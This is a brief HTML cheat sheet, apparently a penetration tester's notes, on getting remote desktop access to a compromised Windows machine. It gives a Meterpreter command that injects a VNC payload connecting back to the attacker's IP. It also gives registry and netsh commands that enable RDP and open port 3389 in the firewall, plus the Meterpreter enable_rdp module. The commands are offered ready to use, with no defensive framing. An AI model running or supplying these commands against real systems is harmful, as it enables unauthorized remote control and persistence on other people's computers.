<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>RDP</title>
</head><body>+ <b>Using meterpreter, inject vnc session</b>: <br/>
run post/windows/manage/payload_inject payload=windows/vncinject/reverse_tcp lhost=&lt;yourip&gt; options=viewonly=false<br/>
<br/>
+ <b>Enable RDP</b>: <br/>
netsh firewall set service RemoteDesktop enable<br/>
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<br/>
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f<br/>
<br/>
sc config TermService start= auto<br/>
net start Termservice<br/>
netsh.exe<br/>
firewall<br/>
add portopening TCP 3389 "Remote Desktop"<br/>
<br/>
<b>OR:</b>&nbsp;<br/>
<br/>
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow <br/>
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=tcp<br/>
<br/>
netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow <br/>
program="%SystemRoot%\system32\svchost.exe" service="TermService" description="Inbound rule for the Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes profile=private,domain localport=3389 protocol=udp<br/>
<br/>
<b>OR (meterpreter) </b><br/>
<br/>
run post/windows/manage/enable_rdp<br/>
<br/>
https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/ </body></html>